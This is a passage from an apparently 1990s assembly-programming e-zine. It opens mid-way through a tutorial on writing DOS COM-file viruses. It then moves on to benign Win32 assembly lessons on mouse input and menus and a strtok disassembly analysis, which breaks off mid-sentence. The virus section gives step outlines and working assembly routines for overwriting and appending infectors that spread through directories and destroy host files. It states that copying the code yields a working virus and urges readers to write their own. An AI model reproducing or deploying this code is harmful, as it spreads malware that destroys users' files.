+(credit goes to Dark Angel for this nifty drawing):
+
+   +---------------+   +-------+   +---------------+
+   | P R O G R A M | + | VIRUS | = | VIRUS | R A M |
+   +---------------+   +-------+   +---------------+
+
+We won't really care about reinfection with this type of virus,  since there is
+no more file growth and also because  this virus is easily noticed.  An outline
+for a overwriting virus looks like this:
+
+   1. <Find_First> file
+   2. <Open_File> in read/write mode
+   3. <Copy_Body> of virus over the host
+   4. <Close_File> handle
+   5. <Find_Next> file
+      (a) If another file found then goto step 2
+   6. <Return_Control> back to DOS
+
+Here is the copy routine  for the overwriting virus  (don't forget to strip out
+the displacement calculations for this type of viruses):
+
+--8<---------------------------------------------------------------------------
+Copy_Body:
+        mov     ah, 40h
+        mov     bx, word ptr [bp+F_Handle]
+        mov     cx, Virus_End - Virus_Start
+        lea     dx, [bp+offset Virus_Start]
+        int     21h
+        ;jc      Close_File             ;No need since it's right after
+        cmp     cx, ax
+        ;jnz     Return_Control         ;Place  this  after  the   <Close_File>
+                                        ; routine,  since you  shouldn't  leave
+                                        ; unclosed file handles
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      40h     - Write to File or Device, Using a Handle
+;On entry:      AH      - 40h
+;               BX      - File handle
+;               CX      - Number of bytes to write
+;               DS:DX   - Address of buffer
+;Returns:       AX      - Number of bytes written, or
+;                         Error code, if CF is set
+;Error codes:   5       - Access denied
+;               6       - Invalid handle
+;Network: Requires Write access rights
+;Notes: Data is written starting at the current file pointer.  The file pointer
+;       is  then incremented  by the  number of  bytes written.  If a disk full
+;       condition is encountered, no error code will be returned (i.e., CF will
+;       not  be set);  however,  fewer  bytes  than  requested  will have  been
+;       written.  You should  check for  this condition by  testing for AX less
+;       than CX after returning from the function.
+
+WARNING: This virus will infect and partially  or totally destroy all COM files
+         in the current directory!
+
+
+Exiting To DOS
+--------------
+In an overwriting virus you need not pass control back to the host, since it is
+partially (or totally) destroyed,  so all the virus needs to do is exit to DOS.
+This can be done in any of this ways:
+
+--8<---------------------------------------------------------------------------
+Return_Control:
+        mov     ah, 4Ch
+        mov     al, 00h
+        int     21h
+
+        ;mov     ah, 00h                ;Here is another way
+        ;int     21h
+
+        ;int     20h                    ;And another
+
+        ;ret                            ;Yet another way
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      4Ch     - Terminate a Process (EXIT)
+;On entry:      AH      - 4Ch
+;               AL      - Return code
+;Returns:       Nothing
+;Notes: This function  is the  proper method  of terminating  a program  in DOS
+;       versions 2.0 and above.  It closes all files, and hands control back to
+;       the parent process  (usually COMMAND.COM),  along with the  return code
+;       specified in AL.
+
+;Interrupt:     21h
+;Function:      00h     - Terminate Program
+;On entry:      AH      - 00h
+;               CS      - Segment address of PSP
+;Returns:       Nothing
+;Notes: DOS terminates the program, flushes the file buffers,  and restores the
+;       terminate, Ctrl-Break,  and critical error exit addresses from the PSP.
+;       Close all files first.
+
+;INT 20h                - Terminate Program
+;On entry:      CS      - Segment address of PSP
+;Returns:       Nothing
+;Notes: Is equivalent to Interrupt 21h, Function 00h.
+
+
+An Appending Virus
+------------------
+The appending  virus works  by placing  its code at the  end of the host,  then
+copying the first bytes to a safe location and adding a jump to its code at the
+beginning  so that it takes  control before the  host does.  Unlike overwriting
+viruses,  no part of  the host is  permanently destroyed,  so it  will be  much
+harder to notice an infection. It looks like this:
+
+   +-----------------------------+---------+-------+--------------------------+
+   | JMP to Virus_Start + IDMark | PROGRAM | Virus | First 5 bytes of PROGRAM |
+   +-----------------------------+---------+-------+--------------------------+
+
+We will worry about  reinfection on this one,  directory preservation  and some
+other things. And here is an outline:
+
+   1. <Host> (jumps to start of virus)
+   2. Calculate the <Delta_Offset>
+   3. <Save_AX> register
+   4. <Restore_Host>'s 5 original beginning bytes
+   5. <Set_DTA> to a new address
+   6. <Get_Directory> (the current one)
+   7. <Find_First> file
+   8. <Open_File> in read/write mode
+   9. <Read_Five> bytes from beginning of file
+   10. <Check_IDMark> for previous infection
+   11. <Check_Size> of intended host
+   12. <PointTo_Begin> of file
+   13. <Calc_Jump> to main virus body
+   14. <Write_Jump> to host
+   15. <PointTo_End> of file
+   16. <Copy_Body> of virus and the 5 bytes from the beginning of the file
+   17. <Close_File> handle
+   18. <Find_Next> file
+      (a) If another file found then goto step 8
+   19. <ChangeTo_Parent> directory
+      (a) If not already in root then goto step 7
+   20. <Return_Control> (for the appending virus this is just a label)
+   21. <ChangeTo_Root> directory
+   22. <Restore_Directory> to original one
+   23. <Restore_DTA> to PSP:0080h
+   24. <Restore_AX> register
+   25. <ReturnTo_Host> back to the host
+
+Here is how to restore the host's original 5 bytes:
+
+--8<---------------------------------------------------------------------------
+Restore_Host:
+        mov     cx, 5
+        lea     si, [bp+offset IDMark]
+        mov     di, 100h
+        rep     movsb
+---------------------------------------------------------------------------8<--
+
+To move the file pointer to be beginning of the file:
+
+--8<---------------------------------------------------------------------------
+PointTo_Begin:
+        mov     ah, 42h
+        mov     al, 0
+        mov     bx, word ptr [bp+F_Handle]
+        mov     cx, 0
+        mov     dx, 0
+        int     21h
+        jnc     Calc_Jump
+        jmp     Close_File
+---------------------------------------------------------------------------8<--
+
+;Interrupt:     21h
+;Function:      42h     - Move File Pointer (LSEEK)
+;On entry:      AH      - 42h
+;               BX      - File handle
+;               CX:DX   - Offset, in bytes (signed 32-bit integer)
+;               AL      - Mode code (see below)
+;Mode Code:     AL      - Action
+;               0       - Move pointer CX:DX bytes from beginning of file
+;               1       - Move pointer CX:DX bytes from current location
+;               2       - Move pointer CX:DX bytes from end of file
+;Returns:       DX:AX   - New pointer location (signed 32-bit integer),
+;               or AX   - Error code, if CF is set
+;Error codes:   1       - Invalid mode code
+;               6       - Invalid handle
+
+And the calculate the new jump according to the host size:
+
+--8<---------------------------------------------------------------------------
+Calc_Jump:
+        mov     ax, word ptr [bp+F_Size]
+        sub     ax, 3
+        mov     word ptr [bp+Jump+1], ax
+---------------------------------------------------------------------------8<--
+
+Of course a buffer holding the jump instruction and the marker must exist:
+
+--8<---------------------------------------------------------------------------
+Jump            db      0E9h, 2, 0, 'ID'
+---------------------------------------------------------------------------8<--
+
+Then you write to the host the calculated jump to the start of your virus:
+
+--8<---------------------------------------------------------------------------
+Write_Jump:
+        mov     ah, 40h
+        mov     cx, 5
+        lea     dx, [bp+offset Jump]
+        int     21h
+        jnc     In_Between
+        jmp     Close_File
+In_Between:
+        cmp     cx, ax
+        jz      PointTo_End
+        jmp     Close_File
+---------------------------------------------------------------------------8<--
+
+After you move the file pointer to the end of the file:
+
+--8<---------------------------------------------------------------------------
+PointTo_End:
+        mov     ah, 42h
+        mov     al, 2
+        mov     bx, word ptr [bp+F_Handle]
+        mov     cx, 0
+        mov     dx, 0
+        int     21h
+        jnc     Copy_Body
+        jmp     Close_File
+---------------------------------------------------------------------------8<--
+
+And to append  the virus to it all you need to do  is use the routine presented
+for the overwriting virus.
+
+Also don't forget to first save and then restore the AX register since we'll be
+using it  in the virus  (this will avoid  programs like HotDIR  from failing to
+run):
+
+--8<---------------------------------------------------------------------------
+Save_AX:
+        push    ax
+---------------------------------------------------------------------------8<--
+
+To restore it:
+
+--8<---------------------------------------------------------------------------
+Restore_AX:
+        pop     ax
+---------------------------------------------------------------------------8<--
+
+WARNING: Be careful with this virus  since it will infect almost every  'clean'
+         COM file in the current directory and all parent directories up to the
+         root!
+
+
+Passing Control Back To The Host
+--------------------------------
+To restore control back to the host all you need to do is set the IP to 100h:
+
+--8<---------------------------------------------------------------------------
+ReturnTo_Host:
+        push    100h
+        ret
+
+        ;mov     di, 100h               ; Another way of accomplishing the same
+        ;jmp     di
+---------------------------------------------------------------------------8<--
+
+
+Miscellaneous
+-------------
+Don't forget  to place a 'Virus_Start:'  label at the start  of the viral  code
+(for the appending virus  that is right after the ID byte  and right before the
+delta offset calculation routine;  for the overwriting virus it's  right at the
+start of the code,  since there's no need for a dummy host)  and a 'Virus_End:'
+label at the end of the viral code, right after the initialized data and before
+the uninitialized one. Here's out it's supposed to look like:
+
+Host:                                   ;This part for the appending virus only
+   [Jump to virus code]                 ;"                 "                  "
+   [IDByte]                             ;"                 "                  "
+Virus_Start:
+   [Virus code]
+   ...
+   [Data that needs to be copyed with the code]
+Virus_End:
+   [Uninitialized data that needs not be copyed]
+
+Change the control flow  instructions according to your virus needs.  Anyway if
+you copy everything as is, you'll end up with a working virus.
+
+
+.BIN File Structure
+-------------------
+BIN files are exactly like COM files, they  only have a different extension and
+so must be renamed to be run by DOS.  If you want you can  for example set your
+viruses to infect  BIN files if no COM ones are found in the current directory.
+These type of files are normally created by the EXE2BIN program.
+
+
+In Closing
+----------
+Well with this knowledge you can now start writing  your own viruses.  In future
+articles  I'll explain some  more search  and replication  routines among  some
+other things. If there are any next articles that is!
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::................................WIN32.ASSEMBLY.PROGRAMMING
+                                                     Mouse Input
+                                                     by Iczelion
+
+
+We will learn how to receive and respond to mouse input in our window
+procedure. The example program will wait for left mouse clicks and display
+a text string at the exact clicked spot in the client area.
+
+Preliminary:
+
+As with keyboard input, Windows detects and sends notifications about relevant
+mouse activities to each window. These activities include left and right clicks,
+mouse cursor movements over window, double clicks. Unlike keyboard input which
+is directed to the window that has input focus, mouse messages are sent to any
+window that the mouse cursor is over, active or not. In addition, there are mouse
+messages about the non-client area too. But most of the time, we can blissfully
+ignore them. We can focus on those relating to the client area.
+
+For each left and right mouse button, there are two associated messages:
+WM_LBUTTONDOWN,WM_RBUTTONDOWN and WM_LBUTTONUP, WM_RBUTTONUP messages. For
+a mouse with three buttons, there are also WM_MBUTTONDOWN and WM_MBUTTONUP.
+When the mouse cursor moves over the client area, Windows sends
+WM_MOUSEMOVE messages to the window under the cursor.
+
+A window can receive double click messages, WM_LBUTTONDBCLK or
+WM_RBUTTONDBCLK, if and only if its window class has been defined to
+receive them by including CS_DBLCLKS flag in the class style,else the
+window will receive only a series of mouse button up and down messages.
+For all these messages, the value of lParam contains the position of the
+mouse. The low word is the x-coordinate, and the high word is the
+y-coordinate relative to upper left corner of the client area of the
+window. wParam indicates the state of the mouse buttons and Shift and Ctrl
+keys.
+
+
+Content:
+
+include windows.inc
+includelib user32.lib
+includelib kernel32.lib
+includelib gdi32.lib
+
+.data
+ClassName db "SimpleWinClass",0
+AppName  db "Our First Window",0
+MouseClick db 0         ; 0=no click yet
+
+.data?
+hInstance HINSTANCE ?
+CommandLine LPSTR ?
+hitpoint POINT <>
+
+.code
+start:
+    invoke GetModuleHandle, NULL
+    mov    hInstance,eax
+    invoke GetCommandLine
+    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT
+    invoke ExitProcess,eax
+
+WinMain proc
+hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:SDWORD
+    LOCAL wc:WNDCLASSEX
+    LOCAL msg:MSG
+    LOCAL hwnd:HWND
+    mov   wc.cbSize,SIZEOF WNDCLASSEX
+    mov   wc.style, CS_HREDRAW or CS_VREDRAW
+    mov   wc.lpfnWndProc, OFFSET WndProc
+    mov   wc.cbClsExtra,NULL
+    mov   wc.cbWndExtra,NULL
+    push  hInstance
+    pop   wc.hInstance
+    mov   wc.hbrBackground,COLOR_WINDOW+1
+    mov   wc.lpszMenuName,NULL
+    mov   wc.lpszClassName,OFFSET ClassName
+    invoke LoadIcon,NULL,IDI_APPLICATION
+    mov   wc.hIcon,eax
+    mov   wc.hIconSm,0
+    invoke LoadCursor,NULL,IDC_ARROW
+    mov   wc.hCursor,eax
+    invoke RegisterClassEx, addr wc
+    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\
+           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\
+           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\
+           hInst,NULL
+    mov   hwnd,eax
+    invoke ShowWindow, hwnd,SW_SHOWNORMAL
+    invoke UpdateWindow, hwnd
+    .WHILE TRUE
+                invoke GetMessage, ADDR msg,NULL,0,0
+                .BREAK .IF (!eax)
+                invoke DispatchMessage, ADDR msg
+    .ENDW
+    mov     eax,msg.wParam
+    ret
+WinMain endp
+
+WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
+    LOCAL hdc:HDC
+    LOCAL ps:PAINTSTRUCT
+
+    mov   eax,uMsg
+    .IF eax==WM_DESTROY
+        invoke PostQuitMessage,NULL
+    .ELSEIF eax==WM_LBUTTONDOWN
+        mov eax,lParam
+        shl eax,16
+        shr eax,16
+        mov hitpoint.x,eax
+        mov eax,lParam
+        shr eax,16
+        mov hitpoint.y,eax
+        mov MouseClick,TRUE
+        invoke InvalidateRect,hWnd,NULL,TRUE
+    .ELSEIF eax==WM_PAINT
+        invoke BeginPaint,hWnd, ADDR ps
+        mov    hdc,eax
+        .IF MouseClick
+            invoke lstrlen,ADDR AppName
+            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax
+        .ENDIF
+        invoke EndPaint,hWnd, ADDR ps
+    .ELSE
+        invoke DefWindowProc,hWnd,uMsg,wParam,lParam
+        ret
+    .ENDIF
+    xor    eax,eax
+    ret
+WndProc endp
+end start
+
+Time to analyze the program.
+
+    .ELSEIF eax==WM_LBUTTONDOWN
+        mov eax,lParam
+        and eax,0FFFFh
+        mov hitpoint.x,eax
+        mov eax,lParam
+        shr eax,16
+        mov hitpoint.y,eax
+        mov MouseClick,TRUE
+        invoke InvalidateRect,hWnd,NULL,TRUE
+
+The window procedure waits for left mouse button click. When it receives
+WM_LBUTTONDOWN, lParam contains the coordinate of the mouse cursor in the
+client area. It saves the coordinate in a variable of type POINT which is
+defined as:
+
+POINT STRUCT
+    x   dd ?
+    y   dd ?
+POINT ENDS
+
+and sets the flag, MouseClick, to TRUE, meaning that there's at least a
+left mouse button click in the client area.
+
+        mov eax,lParam
+        and eax,0FFFFh
+        mov hitpoint.x,eax
+
+Since x-coordinate is the low word of lParam and the members of POINT
+structure are 32-bit in size, we have to zero out the high word of eax
+prior to storing it in hitpoint.x.
+
+        shr eax,16
+        mov hitpoint.y,eax
+
+Because y-coordinate is the high word of lParam, we must put it in the low
+word of eax prior to storing it in hitpoint.y. We do this by shifting eax
+16 bits to the right.
+
+After storing the mouse position, we set the flag, MouseClick, to TRUE in
+order to let the painting code in WM_PAINT section know that there's at
+least a click in the client area so it can draw the string at the mouse
+position. Next  we call InvalidateRect function to force the window to
+repaint its entire client area.
+
+        .IF MouseClick
+            invoke lstrlen,ADDR AppName
+            invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax
+        .ENDIF
+
+The painting code in WM_PAINT section must check if MouseClick is true,
+since when the window was created, it received a WM_PAINT message which at
+that time, no mouse click had occurred so it should not draw the string in
+the client area. We initialize MouseClick to FALSE and change its value to
+TRUE when an actual mouse click occurs.
+If at least one mouse click has occurred, it draws the string in the client
+area at the mouse position. Note that it calls lstrlen to get the length of
+the string to display and sends the length as the last parameter of TextOut
+function.
+
+      [Reprinted With permission from Iczelion's Win32 Assembly HomePage]
+                   http://203.148.211.201/iczelion/index.html
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::................................WIN32.ASSEMBLY.PROGRAMMING
+                                                     Menus
+                                                     by Iczelion
+
+
+In this tutorial, we will learn how to incorporate a menu into our window.
+
+Preliminary:
+
+Menu is one of the most important component in your window. Menu presents a
+list of services a program offers to the user. The user doesn't have to
+read the manual included with the program to be able to  use it, he can
+peruse the menu to get an overview of the capability of a particular
+program and start playing with it immediately. Since a menu is a tool to
+get the user up and running quickly, you should follow the standard.
+Succintly put, the first two menu items should be File and Edit and the
+last should be Help. You can insert your own menu items between Edit and
+Help. If a menu item invokes a dialog box, you should append an ellipsis
+(...) to the menu string.
+
+Menu is a kind of resource. There are several kinds of resources such as
+dialog box, string table, icon, bitmap, menu etc. Resources are described
+in a separated file called a resource file which normally has .rc
+extension. You then combine the resources with the source code during the
+link stage. The final product is an executable file which contains both
+instructions and resources.
+
+You can write resource scripts using any text editor. They're composed of
+phrases which describe the appearances and other attributes of the
+resources used in a particular program Although you can write resource
+scripts with a text editor, it's rather difficult. A better alternative is
+to use a resource editor which lets you visually design any resource with
+ease. Resource editors are usually included in compiler packages such as
+Visual C++, Borland C++, etc. They write a resource file for you.
+You describe a menu resource like this:
+
+
+     MyMenu  MENU
+     {
+        [menu list here]
+     }
+
+C programmers may recognize that it is similar to declaring a structure.
+MyMenu being a menu name followed by MENU keyword and menu list within
+curly brackets. Alternatively, you can use BEGIN and END instead of the
+curly brackets if you wish. This syntax is more palatable to Pascal
+programmers.
+
+Menu list can be either MENUITEM or POPUP statement.
+
+MENUITEM statement defines a menu bar which doesn't invoke a popup menu
+when selected.The syntax is as follows:
+
+     MENUITEM "&text", ID [,options]
+
+It begins by MENUITEM keyword followed by the text you want to use as menu
+bar string. Note the ampersand. It causes the character that follows it to
+be underlined. Following the text string is the ID of the menu item. The ID
+is a number that will be used to identify the menu item in the message sent
+to the window procedure when the menu item is selected. As such, each menu
+ID must be unique among themselves.
+Options are optional. Available options are as follows:
+
+   o GRAYED  The menu item is inactive, and it does not generate a
+     WM_COMMAND message. The text is grayed.
+   o INACTIVE The menu item is inactive, and it does not generate a
+     WM_COMMAND message. The text is displayed normally.
+   o MENUBREAK  This item and the following items appear on a new line of
+     the menu.
+   o HELP  This item and the following items are right-justified.
+
+You can use one of the above option or combine them with "or" operator.
+Beware that INACTIVE and GRAYED cannot be combined together.
+POPUP statement has the following syntax:
+
+     POPUP "&text" [,options]
+     {
+       [menu list]
+     }
+
+POPUP statement defines a menu bar that, when selected, drops down a list
+of menu items in a small popup window. The menu list can be a MENUTIEM or
+POPUP statement. There's a special kind of MENUITEM statement, MENUITEM
+SEPARATOR, which will draw a horizontal line in the popup window.
+
+The next step after you are finished with the menu resource script is to
+reference it in your program.
+You can do this in two different places in your program.
+   o In lpszMenuName member of WNDCLASSEX structure. Say, if you have a
+     menu named "FirstMenu", you can assigned the menu to your window like
+     this:
+
+               .DATA
+                    MenuName  db "FirstMenu",0
+               ...........................
+               ...........................
+               .CODE
+                    ...........................
+                    mov   wc.lpszMenuName, OFFSET MenuName
+                    ...........................
+   o In menu handle parameter of CreateWindowEx like this:
+               .DATA
+                    MenuName  db "FirstMenu",0
+                    hMenu HMENU ?
+               ...........................
+               ...........................
+               .CODE
+                    ...........................
+                    invoke LoadMenu, hInst, OFFSET MenuName
+                    mov   hMenu, eax
+                    invoke CreateWindowEx,NULL,OFFSET ClsName,\
+                                OFFSET Caption, WS_OVERLAPPEDWINDOW,\
+                                CW_USEDEFAULT,CW_USEDEFAULT,\
+                                CW_USEDEFAULT,CW_USEDEFAULT,\
+                                NULL,\
+                                hMenu,\
+                                hInst,\
+                                NULL\
+                    ...........................
+So you may ask, what's the difference between these two methods?
+When you reference the menu in the WNDCLASSEX structure, the menu becomes
+the "default" menu for the window class. Every window of that class will
+have the same menu.
+
+If you want each window created from the same class to have different
+menus, you must choose the second form. In this case, any window that is
+passed a menu handle in its CreateWindowEx function will have a menu that
+"overrides" the default menu defined in the WNDCLASSEX structure.
+Next we will examine how a menu notifies the window procedure when the user
+selects a menu item.
+When the user selects a menu item, the window procedure will receive a
+WM_COMMAND message. The low word of wParam contains the menu ID of the
+selected menu item.
+Now we have sufficient information to create and use a menu. Let's do it.
+
+Content:
+
+The first example shows how to create and use a menu by specifying the menu
+name in the window class.
+
+include windows.inc
+includelib user32.lib
+includelib kernel32.lib
+includelib gdi32.lib
+
+.data
+ClassName db "SimpleWinClass",0
+AppName  db "Our First Window",0
+MenuName db "FirstMenu",0                ; The name of our menu in the
+resource file.
+Test_string db "You selected Test menu item",0
+Hello_string db "Hello, my friend",0
+Goodbye_string db "See you again, bye",0
+
+.data?
+hInstance HINSTANCE ?
+CommandLine LPSTR ?
+
+.const
+IDM_TEST equ 1                    ; Menu IDs
+IDM_HELLO equ 2
+IDM_GOODBYE equ 3
+IDM_EXIT equ 4
+
+.code
+start:
+    invoke GetModuleHandle, NULL
+    mov    hInstance,eax
+    invoke GetCommandLine
+    invoke WinMain, hInstance,NULL,CommandLine, SW_SHOWDEFAULT
+    invoke ExitProcess,eax
+
+WinMain proc
+hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:SDWORD
+    LOCAL wc:WNDCLASSEX
+    LOCAL msg:MSG
+    LOCAL hwnd:HWND
+    mov   wc.cbSize,SIZEOF WNDCLASSEX
+    mov   wc.style, CS_HREDRAW or CS_VREDRAW
+    mov   wc.lpfnWndProc, OFFSET WndProc
+    mov   wc.cbClsExtra,NULL
+    mov   wc.cbWndExtra,NULL
+    push  hInstance
+    pop   wc.hInstance
+    mov   wc.hbrBackground,COLOR_WINDOW+1
+    mov   wc.lpszMenuName,OFFSET MenuName        ; Put our menu name here
+    mov   wc.lpszClassName,OFFSET ClassName
+    invoke LoadIcon,NULL,IDI_APPLICATION
+    mov   wc.hIcon,eax
+    mov   wc.hIconSm,0
+    invoke LoadCursor,NULL,IDC_ARROW
+    mov   wc.hCursor,eax
+    invoke RegisterClassEx, addr wc
+    invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\
+           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\
+           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\
+           hInst,NULL
+    mov   hwnd,eax
+    invoke ShowWindow, hwnd,SW_SHOWNORMAL
+    invoke UpdateWindow, hwnd
+    .WHILE TRUE
+                invoke GetMessage, ADDR msg,NULL,0,0
+                .BREAK .IF (!eax)
+                invoke DispatchMessage, ADDR msg
+    .ENDW
+    mov     eax,msg.wParam
+    ret
+WinMain endp
+
+WndProc proc hWnd:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
+    mov   eax,uMsg
+    .IF eax==WM_DESTROY
+        invoke PostQuitMessage,NULL
+    .ELSEIF eax==WM_COMMAND
+        mov eax,wParam
+        .IF ax==IDM_TEST
+            invoke MessageBox,NULL,ADDR Test_string,OFFSET AppName,MB_OK
+        .ELSEIF ax==IDM_HELLO
+            invoke MessageBox, NULL,ADDR Hello_string, OFFSET AppName,MB_OK
+
+        .ELSEIF ax==IDM_GOODBYE
+            invoke MessageBox,NULL,ADDR Goodbye_string, OFFSET AppName,
+MB_OK
+        .ELSE
+            invoke DestroyWindow,hWnd
+        .ENDIF
+    .ELSE
+        invoke DefWindowProc,hWnd,uMsg,wParam,lParam
+        ret
+    .ENDIF
+    xor    eax,eax
+    ret
+WndProc endp
+end start
+****************************************************************
+                                  Menu.rc
+****************************************************************
+#define IDM_TEST 1
+#define IDM_HELLO 2
+#define IDM_GOODBYE 3
+#define IDM_EXIT 4
+
+FirstMenu MENU
+{
+ POPUP "&PopUp"
+        {
+         MENUITEM "&Say Hello",IDM_HELLO
+         MENUITEM "Say &GoodBye", IDM_GOODBYE
+         MENUITEM SEPARATOR
+         MENUITEM "E&xit",IDM_EXIT
+        }
+ MENUITEM "&Test", IDM_TEST
+}
+  ------------------------------------------------------------------------
+
+Let's analyze the resource file first.
+
+     #define IDM_TEST 1                /* equal to IDM_TEST equ 1*/
+     #define IDM_HELLO 2
+     #define IDM_GOODBYE 3
+     #define IDM_EXIT 4
+
+The above lines define the menu IDs used by the menu script. You can assign
+any value to the ID as long as the value is unique in the menu.
+
+FirstMenu MENU
+
+Declare your menu with MENU keyword.
+
+ POPUP "&PopUp"
+        {
+         MENUITEM "&Say Hello",IDM_HELLO
+         MENUITEM "Say &GoodBye", IDM_GOODBYE
+         MENUITEM SEPARATOR
+         MENUITEM "E&xit",IDM_EXIT
+        }
+
+Define a popup menu with four menu items, the third one is a menu
+separator.
+
+ MENUITEM "&Test", IDM_TEST
+
+Define a menu bar in the main menu.
+Next we will examine the source code.
+
+     MenuName db "FirstMenu",0                ; The name of our menu in the
+     resource file.
+     Test_string db "You selected Test menu item",0
+     Hello_string db "Hello, my friend",0
+     Goodbye_string db "See you again, bye",0
+
+MenuName is the name of the menu in the resource file. Note that you can
+define more than one menu in the resource file so you must specify which
+menu you want to use. The remaining three lines define the text strings to
+be displayed in message boxes that are invoked when the appropriate menu
+item is selected by the user.
+
+     IDM_TEST equ 1                    ; Menu IDs
+     IDM_HELLO equ 2
+     IDM_GOODBYE equ 3
+     IDM_EXIT equ 4
+
+Define menu IDs for use in the window procedure. These values MUST be
+identical to those defined in the resource file.
+
+    .ELSEIF eax==WM_COMMAND
+        mov eax,wParam
+        .IF ax==IDM_TEST
+            invoke MessageBox,NULL,ADDR Test_string,OFFSET AppName,MB_OK
+        .ELSEIF ax==IDM_HELLO
+            invoke MessageBox, NULL,ADDR Hello_string, OFFSET AppName,MB_OK
+
+        .ELSEIF ax==IDM_GOODBYE
+            invoke MessageBox,NULL,ADDR Goodbye_string, OFFSET AppName,
+MB_OK
+        .ELSE
+            invoke DestroyWindow,hWnd
+        .ENDIF
+
+In the window procedure, we process WM_COMMAND messages. When the user
+selects a menu item, the menu ID of that menu item is sended to the window
+procedure in the low word of wParam along with the WM_COMMAND message. So
+when we store the value of wParam in eax, we compare the value in ax to the
+menu IDs we defined previously and act accordingly. In the first three
+cases, when the user selects Test, Say Hello, and Say GoodBye menu items,
+we just display a text string in a message box.
+If the user selects Exit menu item, we call DestroyWindow with the handle
+of our window as its parameter which will close our window.
+As you can see, specifying menu name in a window class is quite easy and
+straightforward. However you can also use an alternate method to load a
+menu in your window. I won't show the entire source code here. The resource
+file is the same in both methods. There are some minor changes in the
+source file which I 'll show below.
+
+     .data?
+     hInstance HINSTANCE ?
+     CommandLine LPSTR ?
+     hMenu HMENU ?                    ; handle of our menu
+
+Define a variable of type HMENU to store our menu handle.
+
+        invoke LoadMenu, hInst, OFFSET MenuName
+        mov    hMenu,eax
+        INVOKE CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\
+           WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\
+           CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,hMenu,\
+           hInst,NULL
+
+Before calling CreateWindowEx, we call LoadMenu with the instance handle
+and a pointer to the name of our menu. LoadMenu returns the handle of our
+menu in the resource file which we pass to CreateWindowEx.
+
+
+      [Reprinted With permission from Iczelion's Win32 Assembly HomePage]
+                   http://203.148.211.201/iczelion/index.html
+
+
+
+::/ \::::::.
+:/___\:::::::.
+/|    \::::::::.
+:|   _/\:::::::::.
+:| _|\  \::::::::::.
+:::\_____\:::::::::::........................THE.C.STANDARD.LIBRARY.IN.ASSEMBLY
+                                                           The _strtok function
+                                                           by Xbios2
+
+
+I. INTRODUCTION
+---------------
+
+C syntax: char *strtok(char *s1, const char *s2);
+
+
+Description
+
+strtok considers the string s1 to consist of a sequence of zero or more text
+tokens, separated by spans of one or more characters from the separator string
+s2.
+The first call to strtok returns a pointer to the first character of the first
+token in s1 and writes a null character into s1 immediately following the
+returned token. Subsequent calls with null for the first argument will work
+through the string s1 in this way, until no tokens remain.
+The separator string, s2, can be different from call to call.
+
+
+Comparing different strtok functions requires a much different approach than
+strlen and strcpy. This is because the overall speed is not related only to n,
+the length of the main string, but on many other things, such as the total
+number of tokens, the number of characters between the tokens, the length of the
+delimiter string, etc...
+But this is better seen in practice:
+
+
+
+II. _STRTOK IN BC402
+-------------------
+
+This is the disassembly of the Borland C++ 4.02 library. You can read it as an
+example of non-optimized code, otherwise you may just skip and read the
+explanation.
+
+_strtok         proc near
+
+v_retval        = dword ptr -8
+v_pointer       = dword ptr -4
+a_s1            = dword ptr  8
+a_s2            = dword ptr  0Ch
+
+                enter   8, 0
+                push    edi
+                push    esi
+                mov     edi, [ebp+a_s1]
+                call    __thread_data
+                add     eax, 18h
+                test    edi, edi
+                mov     [ebp+v_pointer], eax
+                jnz     short first_time
+                mov     eax, [ebp+v_pointer]
+                mov     edi, [eax]
+
+first_time:     jmp     short enterPhase1
+; --------------------------------------------
+loopPhase1:     mov     esi, [ebp+a_s2]
+                jmp     short enterScan1
+; --------------------------------------------
+loopScan1:      mov     al, [esi]
+                cmp     al, [edi]
+                jz      short endScan1
+                inc     esi
+
+enterScan1:     mov     al, [esi]
+                test    al, al
+                jnz     short loopScan1
+
+endScan1:       mov     al, [esi]
+                test    al, al
+                jz      short exitPhase1
+                inc     edi
+
+enterPhase1:    mov     al, [edi]
+                test    al, al
+                jnz     short loopPhase1
+
+exitPhase1:     mov     al, [edi]
+                test    al, al
+                jnz     short phase2
+                mov     eax, [ebp+v_pointer]
+                mov     [eax], edi
+                xor     eax, eax
+                jmp     short return
+; --------------------------------------------
+phase2:         mov     [ebp+v_retval], edi
+                jmp     short enterPhase2
+; --------------------------------------------
+loopPhase2:     mov     esi, [ebp+a_s2]
+                jmp     short enterScan2
+; --------------------------------------------
+loopScan2:      mov     al, [esi]
+                cmp     al, [edi]
+                jnz     short nextScan2
+                mov     byte ptr [edi], 0
+                inc     edi
+                mov     eax, [ebp+v_pointer]
+                mov     [eax], edi
+                mov     eax, [ebp+v_retval]
+                jmp     short return
+; --------------------------------------------
+nextScan2:      inc     esi
+
+enterScan2:     mov     al, [esi]
+                test    al, al
+                jnz     short loopScan2
+                inc     edi
+
+enterPhase2:    mov     al, [edi]
+                test    al, al
+                jnz     short loopPhase2
+                mov     eax, [ebp+v_pointer]
+                mov     [eax], edi
+                mov     eax, [ebp+v_retval]
+
+return:         pop     esi
+                pop     edi
+                leave
+                retn
+_strtok         endp
+
+Explanation:
+First af all, s1 is checked. If it is null, the pointer to the string is
